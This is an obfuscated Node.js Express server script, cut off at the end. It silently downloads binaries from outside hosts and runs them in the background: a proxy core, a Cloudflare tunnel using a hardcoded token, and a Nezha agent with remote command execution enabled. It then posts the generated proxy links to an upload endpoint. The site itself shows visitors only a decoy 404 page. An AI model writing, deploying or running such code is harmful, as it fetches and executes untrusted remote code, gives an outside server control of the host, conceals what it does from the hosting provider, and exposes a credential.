'use strict';const _0x486a23=_0x2e04;(function(_0xfc7b52,_0x1fc351){const _0x57fc09=_0x2e04,_0x45d85f=_0xfc7b52();while(!![]){try{const _0x5c22d9=parseInt(_0x57fc09(0x1ae))/0x1*(parseInt(_0x57fc09(0x14d))/0x2)+-parseInt(_0x57fc09(0x142))/0x3+parseInt(_0x57fc09(0x154))/0x4*(-parseInt(_0x57fc09(0x175))/0x5)+-parseInt(_0x57fc09(0x13c))/0x6+-parseInt(_0x57fc09(0x166))/0x7*(parseInt(_0x57fc09(0x1d9))/0x8)+-parseInt(_0x57fc09(0x1a5))/0x9*(parseInt(_0x57fc09(0x1e3))/0xa)+parseInt(_0x57fc09(0x198))/0xb;if(_0x5c22d9===_0x1fc351)break;else _0x45d85f['push'](_0x45d85f['shift']());}catch(_0x4478e8){_0x45d85f['push'](_0x45d85f['shift']());}}}(_0x1f76,0x2b889));function _0x2e04(_0x2a2b49,_0xd8542e){const _0x1f7626=_0x1f76();return _0x2e04=function(_0x2e0468,_0x2d46a2){_0x2e0468=_0x2e0468-0x13b;let _0x477044=_0x1f7626[_0x2e0468];return _0x477044;},_0x2e04(_0x2a2b49,_0xd8542e);}const express=require(_0x486a23(0x190)),app=express(),axios=require(_0x486a23(0x164)),os=require('os'),fs=require('fs'),path=require(_0x486a23(0x179)),{promisify}=require('util'),exec=promisify(require(_0x486a23(0x1a7))['exec']),{execSync}=require(_0x486a23(0x1a7)),UPLOAD_URL=process[_0x486a23(0x186)][_0x486a23(0x143)]||'',PROJECT_URL=process[_0x486a23(0x186)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x486a23(0x186)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x486a23(0x186)][_0x486a23(0x1ba)]||_0x486a23(0x1c8),SUB_PATH=process['env'][_0x486a23(0x17b)]||_0x486a23(0x1c0),PORT=process[_0x486a23(0x186)]['SERVER_PORT']||process[_0x486a23(0x186)]['PORT']||0xbb8,UUID=process['env'][_0x486a23(0x192)]||_0x486a23(0x170),NEZHA_SERVER=process[_0x486a23(0x186)][_0x486a23(0x148)]||'',NEZHA_PORT=process[_0x486a23(0x186)][_0x486a23(0x13f)]||'',NEZHA_KEY=process[_0x486a23(0x186)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x486a23(0x186)][_0x486a23(0x1d6)]||_0x486a23(0x1cb),ARGO_AUTH=process[_0x486a23(0x186)]['ARGO_AUTH']||'eyJhIjoiOGNhOTliOWUyNjc1YmMxMzRlMGM1YjA4NWQzYTk0MzkiLCJ0IjoiMzdhYTM4MDctMWM1NC00OGZmLTgwYzAtM2NhMjY0YWYzYzZlIiwicyI6IllXWmpZams1WXpVdFpURXdZaTAwWVdRNUxUbGlaamd0TnpnMll6RXlOalV3WkRRMSJ9',ARGO_PORT=process['env'][_0x486a23(0x18a)]||0x1f41,CFIP=process[_0x486a23(0x186)][_0x486a23(0x169)]||'bk.0407123.xyz',CFPORT=process[_0x486a23(0x186)][_0x486a23(0x13d)]||0x1bb,NAME=process[_0x486a23(0x186)][_0x486a23(0x19a)]||'';!fs[_0x486a23(0x18f)](FILE_PATH)&&fs[_0x486a23(0x1da)](FILE_PATH);function generateRandomName(){const _0x48b6b0=_0x486a23,_0x33e158='abcdefghijklmnopqrstuvwxyz';let _0x13b1a0='';for(let _0x1de90d=0x0;_0x1de90d<0x6;_0x1de90d++){_0x13b1a0+=_0x33e158['charAt'](Math[_0x48b6b0(0x14a)](Math['random']()*_0x33e158[_0x48b6b0(0x14b)]));}return _0x13b1a0;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x486a23(0x1d8)](FILE_PATH,npmName),phpPath=path[_0x486a23(0x1d8)](FILE_PATH,phpName),webPath=path[_0x486a23(0x1d8)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x486a23(0x158)),listPath=path[_0x486a23(0x1d8)](FILE_PATH,_0x486a23(0x1bb)),bootLogPath=path[_0x486a23(0x1d8)](FILE_PATH,_0x486a23(0x15f)),configPath=path[_0x486a23(0x1d8)](FILE_PATH,_0x486a23(0x17d));app[_0x486a23(0x1d5)]('/',function(_0x29fc81,_0x1544d0){const _0x23dbbd=_0x486a23,_0x3f596c=_0x23dbbd(0x1ac);_0x1544d0['send'](_0x3f596c);});function deleteNodes(){const _0x240f7a=_0x486a23;try{if(!UPLOAD_URL||!fs['existsSync'](subPath))return;const _0x291276=fs[_0x240f7a(0x176)](subPath,_0x240f7a(0x194)),_0x9b009f=Buffer[_0x240f7a(0x17f)](_0x291276,_0x240f7a(0x1e1))[_0x240f7a(0x197)](_0x240f7a(0x194)),_0x29158d=_0x9b009f[_0x240f7a(0x1c3)]('\x0a')[_0x240f7a(0x1d2)](_0x485876=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x240f7a(0x1c1)](_0x485876));_0x29158d[_0x240f7a(0x14b)]>0x0&&axios[_0x240f7a(0x173)](UPLOAD_URL+_0x240f7a(0x18e),JSON[_0x240f7a(0x1dd)]({'nodes':_0x29158d}),{'headers':{'Content-Type':_0x240f7a(0x172)}})[_0x240f7a(0x19b)](()=>{});}catch(_0x4582f1){}}function cleanupOldFiles(){const _0x3e0cca=_0x486a23;try{const _0x34e637=fs[_0x3e0cca(0x19c)](FILE_PATH);_0x34e637['forEach'](_0x386870=>{try{fs['unlinkSync'](path['join'](FILE_PATH,_0x386870));}catch(_0x375537){}});}catch(_0x11a2e5){}}async function generateConfig(){const _0x406cea=_0x486a23,_0x240813={'log':{'access':_0x406cea(0x15e),'error':_0x406cea(0x15e),'loglevel':_0x406cea(0x19e)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x406cea(0x1df),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x406cea(0x19e),'fallbacks':[{'dest':0xbb9,'xver':0x1},{'path':_0x406cea(0x1c5),'dest':0xbba},{'path':_0x406cea(0x14c),'dest':0xbbb},{'path':_0x406cea(0x177),'dest':0xbbc}]},'streamSettings':{'network':_0x406cea(0x162)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x406cea(0x1df),'settings':{'clients':[{'id':UUID}],'decryption':_0x406cea(0x19e)},'streamSettings':{'network':_0x406cea(0x162),'security':_0x406cea(0x19e)}},{'port':0xbba,'listen':_0x406cea(0x1b6),'protocol':_0x406cea(0x1df),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x406cea(0x19e),'wsSettings':{'path':_0x406cea(0x1c5)}},'sniffing':{'enabled':!![],'destOverride':[_0x406cea(0x1c9),'tls',_0x406cea(0x17a)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x406cea(0x1b6),'protocol':_0x406cea(0x1cc),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x406cea(0x1c9),'tls',_0x406cea(0x17a)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x406cea(0x1b6),'protocol':_0x406cea(0x15d),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x406cea(0x19e),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x406cea(0x1c9),_0x406cea(0x1c6),_0x406cea(0x17a)],'metadataOnly':![]}}],'dns':{'servers':[_0x406cea(0x19d)]},'outbounds':[{'protocol':_0x406cea(0x1ce),'tag':_0x406cea(0x182)},{'protocol':_0x406cea(0x187),'tag':'block'}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x406cea(0x17d)),JSON[_0x406cea(0x1dd)](_0x240813,null,0x2));}function _0x1f76(){const _0xe9aa44=['tunnel.json','join','184wSAUFz','mkdirSync','2096','\x20>/dev/null\x202>&1','stringify','?security=tls&sni=','vless','stream','base64','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','1468700beOwBa','Download\x20','1918896ozYcSO','CFPORT','arm','NEZHA_PORT','\x20-c\x20','pipe','919125VZbKPA','UPLOAD_URL','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0auuid:\x20','\x0acredentials-file:\x20','data','NEZHA_SERVER','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0ainsecure_tls:\x20true\x0areport_delay:\x204\x0aserver:\x20','floor','length','/vmess-argo','34266IfYAHy','\x20-c\x20\x22','amd64','Keep-alive\x20task\x20added\x20successfully','firefox','2087','.ssss.nyc.mn/','16712JDBbPM','Argo\x20tunnel\x20is\x20running','nodes','Nezha\x20running\x20error:\x20','sub.txt','error','writeFileSync','.ssss.nyc.mn/web','type','trojan','/dev/null','boot.log','nohup\x20','/api/add-subscriptions','tcp','log','axios','\x0a\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20-\x20service:\x20http_status:404','6440cldVEE','vless://','https://','CFIP','status','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','platform','\x0atunnel:\x20','clear','arm64','dade9724-96d2-461e-9846-61bf68b9d401','message','application/json','post','?encryption=none&security=tls&sni=','145DrnQVh','readFileSync','/trojan-argo','&path=%2Fvless-argo%3Fed%D2560#','path','quic','SUB_PATH','Failed\x20to\x20upload\x20subscription:','config.json','2053','from','Failed\x20to\x20add\x20keep-alive\x20task:','Error\x20reading\x20log\x20file,\x20using\x20default\x20or\x20env\x20domain.','direct','trim','all','Web\x20core\x20is\x20running','env','blackhole','rm\x20-f\x20','2083','ARGO_PORT','8443','An\x20error\x20occurred\x20during\x20startup:','includes','/api/delete-nodes','existsSync','express','\x20>\x20nul\x202>&1','UUID','del\x20/f\x20/q\x20','utf-8','\x20>/dev/null\x202>&1\x20&','amd','toString','11653730ZqaboF','chmod\x20775\x20','NAME','catch','readdirSync','https+local://8.8.8.8/dns-query','none','Subscription\x20uploaded\x20successfully','Web\x20running\x20error:\x20','response','Could\x20not\x20find\x20Argo\x20domain\x20in\x20log,\x20using\x20default\x20or\x20env.','\x20successfully','trojan://','9ZePxwn','\x0a\x20\x20\x20\x20service:\x20http://localhost:','child_process','aarch64','close','&fp=firefox&type=ws&host=','pop','\x0a\x20\x20<!DOCTYPE\x20html>\x0a\x20\x20<html\x20lang=\x22en\x22>\x0a\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20<title>404\x20Not\x20Found</title>\x0a\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@import\x20url(\x27https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap\x27);\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20\x27Poppins\x27,\x20sans-serif;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(135deg,\x20#1e3c72,\x20#2a5298);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#ffffff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x20100vh;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20overflow:\x20hidden;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20relative;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20z-index:\x202;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20animation:\x20float\x204s\x20ease-in-out\x20infinite;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2010rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20700;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x201;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-shadow:\x200\x205px\x2015px\x20rgba(0,0,0,0.2);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h2\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.8rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20600;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x2010px\x200\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x200.9;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2030px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x20400px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x200.8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20a.button\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#3498db;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#ffffff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2012px\x2025px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2050px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-decoration:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20600;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20background-color\x200.3s\x20ease,\x20transform\x200.3s\x20ease;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x204px\x2010px\x20rgba(0,0,0,0.15);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20a.button:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#2980b9;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateY(-2px);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@keyframes\x20float\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x20transform:\x20translateY(0px);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2050%\x20{\x20transform:\x20translateY(-15px);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x20transform:\x20translateY(0px);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@media\x20(max-width:\x20600px)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\x20font-size:\x207rem;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h2\x20{\x20font-size:\x201.5rem;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\x20max-width:\x2090%;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20</head>\x0a\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>404</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2>Houston,\x20We\x20Have\x20a\x20Problem.</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Looks\x20like\x20you\x27ve\x20ventured\x20into\x20uncharted\x20territory.\x20The\x20page\x20you\x27re\x20looking\x20for\x20might\x20have\x20been\x20moved\x20or\x20never\x20existed.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22#\x22\x20class=\x22button\x22>Go\x20Back\x20Home</a>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20</body>\x0a\x20\x20</html>\x0a\x20\x20','map','2RANbkX','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','subscription','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','true','match','win32','.ssss.nyc.mn/bot','127.0.0.1','/tunnel.yml\x20run','false','\x0aprotocol:\x20http2\x0aingress:\x0a\x20\x20-\x20hostname:\x20','FILE_PATH','list.txt','createWriteStream','fileName','App\x20is\x20running.\x20Setup\x20complete.','tunnel.yml','qianxiuadmin','test','&path=%2Ftrojan-argo%3Fed%D2560#','split','\x0aclient_secret:\x20','/vless-argo','tls','\x20-p\x20','./tmp','http','Nezha\x20agent\x20is\x20running','railway.d.4.8.b.0.d.0.0.1.0.a.2.ip6.arpa','vmess','HTTP\x20server\x20is\x20running\x20on\x20port:\x20','freedom','/vmess-argo?ed=2560','--tls','\x20-s\x20','filter','-----\x20Subscription\x20(Base64)\x20-----','send','get','ARGO_DOMAIN'];_0x1f76=function(){return _0xe9aa44;};return _0x1f76();}function getSystemArchitecture(){const _0x1e6a48=_0x486a23,_0x373f3c=os['arch']();return _0x373f3c[_0x1e6a48(0x18d)](_0x1e6a48(0x13e))||_0x373f3c[_0x1e6a48(0x18d)](_0x1e6a48(0x1a8))?_0x1e6a48(0x13e):_0x1e6a48(0x196);}function downloadFile(_0x1d955a,_0x57a759,_0x1c4a83){const _0x2dfc9f=_0x486a23,_0x592def=fs[_0x2dfc9f(0x1bc)](_0x1d955a);axios({'method':'get','url':_0x57a759,'responseType':_0x2dfc9f(0x1e0)})['then'](_0x2da939=>{const _0x52005c=_0x2dfc9f;_0x2da939[_0x52005c(0x147)][_0x52005c(0x141)](_0x592def),_0x592def['on']('finish',()=>{const _0x1f3371=_0x52005c;_0x592def[_0x1f3371(0x1a9)](),console[_0x1f3371(0x163)](_0x1f3371(0x13b)+path['basename'](_0x1d955a)+_0x1f3371(0x1a3)),_0x1c4a83(null,_0x1d955a);});})[_0x2dfc9f(0x19b)](_0x558b80=>{const _0x3c82ab=_0x2dfc9f;_0x592def[_0x3c82ab(0x1a9)](),fs['unlink'](_0x1d955a,()=>{});const _0x2f3d82=_0x3c82ab(0x13b)+path['basename'](_0x1d955a)+'\x20failed:\x20'+_0x558b80['message'];console['error'](_0x2f3d82),_0x1c4a83(_0x2f3d82);});}async function downloadAndRun(){const _0x23ccd7=_0x486a23,_0x136077=getSystemArchitecture(),_0x51b46e=getFilesForArchitecture(_0x136077);await Promise[_0x23ccd7(0x184)](_0x51b46e[_0x23ccd7(0x1ad)](_0x5c9e8d=>new Promise((_0x4a0b7d,_0xed307e)=>{const _0xfc0247=_0x23ccd7;downloadFile(_0x5c9e8d[_0xfc0247(0x1bd)],_0x5c9e8d['fileUrl'],_0x6d35fb=>_0x6d35fb?_0xed307e(_0x6d35fb):_0x4a0b7d());})));const _0x422453=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];execSync(_0x23ccd7(0x199)+_0x422453[_0x23ccd7(0x1d8)]('\x20'));if(NEZHA_SERVER&&NEZHA_KEY){let _0x4197fe;if(!NEZHA_PORT){const _0x378e28=NEZHA_SERVER['split'](':')[_0x23ccd7(0x1ab)](),_0x58cf50=['443','8443',_0x23ccd7(0x1db),_0x23ccd7(0x152),'2083',_0x23ccd7(0x17e)]['includes'](_0x378e28)?_0x23ccd7(0x1b2):_0x23ccd7(0x1b8),_0x4411c4=_0x23ccd7(0x1c4)+NEZHA_KEY+_0x23ccd7(0x149)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atls:\x20'+_0x58cf50+_0x23ccd7(0x145)+UUID;fs[_0x23ccd7(0x15a)](path[_0x23ccd7(0x1d8)](FILE_PATH,'config.yaml'),_0x4411c4),_0x4197fe=_0x23ccd7(0x160)+phpPath+_0x23ccd7(0x14e)+FILE_PATH+_0x23ccd7(0x1e2);}else{const _0x5252ce=['443',_0x23ccd7(0x18b),_0x23ccd7(0x1db),_0x23ccd7(0x152),_0x23ccd7(0x189),'2053']['includes'](NEZHA_PORT)?_0x23ccd7(0x1d0):'';_0x4197fe=_0x23ccd7(0x160)+npmPath+_0x23ccd7(0x1d1)+NEZHA_SERVER+':'+NEZHA_PORT+_0x23ccd7(0x1c7)+NEZHA_KEY+'\x20'+_0x5252ce+_0x23ccd7(0x1af);}try{await exec(_0x4197fe),console[_0x23ccd7(0x163)](_0x23ccd7(0x1ca));}catch(_0x48e9f3){console[_0x23ccd7(0x159)](_0x23ccd7(0x157)+_0x48e9f3);}}try{await exec(_0x23ccd7(0x160)+webPath+_0x23ccd7(0x140)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&'),console[_0x23ccd7(0x163)](_0x23ccd7(0x185));}catch(_0x40d2d9){console['error'](_0x23ccd7(0x1a0)+_0x40d2d9);}let _0x2294be;if(ARGO_AUTH[_0x23ccd7(0x1b3)](/^[A-Z0-9a-z=]{120,250}$/))_0x2294be='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else{if(ARGO_AUTH[_0x23ccd7(0x1b3)](/TunnelSecret/)){fs[_0x23ccd7(0x15a)](path[_0x23ccd7(0x1d8)](FILE_PATH,_0x23ccd7(0x1d7)),ARGO_AUTH);const _0x1f1492=ARGO_AUTH[_0x23ccd7(0x1c3)]('\x22')[0xb],_0x3f813d=_0x23ccd7(0x16d)+_0x1f1492+_0x23ccd7(0x146)+path['join'](FILE_PATH,_0x23ccd7(0x1d7))+_0x23ccd7(0x1b9)+ARGO_DOMAIN+_0x23ccd7(0x1a6)+ARGO_PORT+_0x23ccd7(0x165);fs[_0x23ccd7(0x15a)](path[_0x23ccd7(0x1d8)](FILE_PATH,'tunnel.yml'),_0x3f813d),_0x2294be=_0x23ccd7(0x1b1)+FILE_PATH+_0x23ccd7(0x1b7);}else _0x2294be=_0x23ccd7(0x144)+bootLogPath+'\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;}try{await exec(_0x23ccd7(0x160)+botPath+'\x20'+_0x2294be+_0x23ccd7(0x195)),console[_0x23ccd7(0x163)](_0x23ccd7(0x155));}catch(_0x26076f){console[_0x23ccd7(0x159)]('Argo\x20running\x20error:\x20'+_0x26076f);}}function getFilesForArchitecture(_0xb78d25){const _0x3f9e97=_0x486a23;let _0x3004a3=[{'fileName':webPath,'fileUrl':'https://'+(_0xb78d25===_0x3f9e97(0x13e)?_0x3f9e97(0x16f):'amd64')+_0x3f9e97(0x15b)},{'fileName':botPath,'fileUrl':_0x3f9e97(0x168)+(_0xb78d25===_0x3f9e97(0x13e)?_0x3f9e97(0x16f):'amd64')+_0x3f9e97(0x1b5)}];if(NEZHA_SERVER&&NEZHA_KEY){const _0x2e20c9=NEZHA_PORT?'agent':'v1',_0x220328=NEZHA_PORT?npmPath:phpPath;_0x3004a3['push']({'fileName':_0x220328,'fileUrl':'https://'+(_0xb78d25===_0x3f9e97(0x13e)?'arm64':_0x3f9e97(0x14f))+_0x3f9e97(0x153)+_0x2e20c9});}return _0x3004a3;}async function extractDomainAndGenerateLinks(){const _0x2f4eba=_0x486a23;await new Promise(_0x3406cc=>setTimeout(_0x3406cc,0x1388));let _0x2e4963=ARGO_DOMAIN;if(!ARGO_AUTH[_0x2f4eba(0x1b3)](/^[A-Z0-9a-z=]{120,250}$/)&&!ARGO_AUTH[_0x2f4eba(0x1b3)](/TunnelSecret/))try{const _0x2d3ae0=fs[_0x2f4eba(0x176)](bootLogPath,_0x2f4eba(0x194)),_0x5e4aa3=_0x2d3ae0['match'](/https?:\/\/([^ ]*trycloudflare\.com)/);_0x5e4aa3?_0x2e4963=_0x5e4aa3[0x1]:console[_0x2f4eba(0x163)](_0x2f4eba(0x1a2));}catch(_0x18063f){console[_0x2f4eba(0x163)](_0x2f4eba(0x181));}console[_0x2f4eba(0x163)]('Using\x20domain:',_0x2e4963);const _0x40a44c=execSync(_0x2f4eba(0x16b),{'encoding':_0x2f4eba(0x194)})[_0x2f4eba(0x183)](),_0x2beeae=NAME?NAME+'-'+_0x40a44c:_0x40a44c,_0x3b9a49={'v':'2','ps':_0x2beeae,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2f4eba(0x19e),'net':'ws','type':_0x2f4eba(0x19e),'host':_0x2e4963,'path':_0x2f4eba(0x1cf),'tls':_0x2f4eba(0x1c6),'sni':_0x2e4963,'alpn':'','fp':_0x2f4eba(0x151)},_0x12449c=[_0x2f4eba(0x167)+UUID+'@'+CFIP+':'+CFPORT+_0x2f4eba(0x174)+_0x2e4963+_0x2f4eba(0x1aa)+_0x2e4963+_0x2f4eba(0x178)+_0x2beeae,'vmess://'+Buffer['from'](JSON[_0x2f4eba(0x1dd)](_0x3b9a49))[_0x2f4eba(0x197)]('base64'),_0x2f4eba(0x1a4)+UUID+'@'+CFIP+':'+CFPORT+_0x2f4eba(0x1de)+_0x2e4963+_0x2f4eba(0x1aa)+_0x2e4963+_0x2f4eba(0x1c2)+_0x2beeae][_0x2f4eba(0x1d8)]('\x0a\x0a'),_0x4aac46=Buffer[_0x2f4eba(0x17f)](_0x12449c)[_0x2f4eba(0x197)](_0x2f4eba(0x1e1));console['log'](_0x2f4eba(0x1d3)),console['log'](_0x4aac46),console['log']('---------------------------------'),fs['writeFileSync'](subPath,_0x4aac46),app[_0x2f4eba(0x1d5)]('/'+SUB_PATH,(_0x440250,_0x422183)=>{const _0x156cac=_0x2f4eba;_0x422183[_0x156cac(0x15c)]('text/plain;\x20charset=utf-8')[_0x156cac(0x1d4)](_0x4aac46);}),await uploadSubscription(_0x12449c);}async function uploadSubscription(_0x198864){const _0x5dd78e=_0x486a23;if(!UPLOAD_URL)return;const _0x1dab5e={};if(PROJECT_URL){_0x1dab5e[_0x5dd78e(0x1b0)]=[PROJECT_URL+'/'+SUB_PATH];try{await axios[_0x5dd78e(0x173)](UPLOAD_URL+_0x5dd78e(0x161),_0x1dab5e,{'headers':{'Content-Type':_0x5dd78e(0x172)}}),console[_0x5dd78e(0x163)](_0x5dd78e(0x19f));}catch(_0x579f04){_0x579f04[_0x5dd78e(0x1a1)]&&_0x579f04['response'][_0x5dd78e(0x16a)]!==0x190&&console[_0x5dd78e(0x159)](_0x5dd78e(0x17c),_0x579f04[_0x5dd78e(0x171)]);}}else{_0x1dab5e[_0x5dd78e(0x156)]=_0x198864[_0x5dd78e(0x1c3)]('\x0a\x0a')[_0x5dd78e(0x1d2)](Boolean);try{await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x1dab5e,{'headers':{'Content-Type':'application/json'}}),console[_0x5dd78e(0x163)]('Nodes\x20uploaded\x20successfully');}catch(_0x3b7c01){console[_0x5dd78e(0x159)]('Failed\x20to\x20upload\x20nodes:',_0x3b7c01[_0x5dd78e(0x171)]);}}}async function keepAlive(){const _0x435b71=_0x486a23;if(AUTO_ACCESS&&PROJECT_URL)try{await 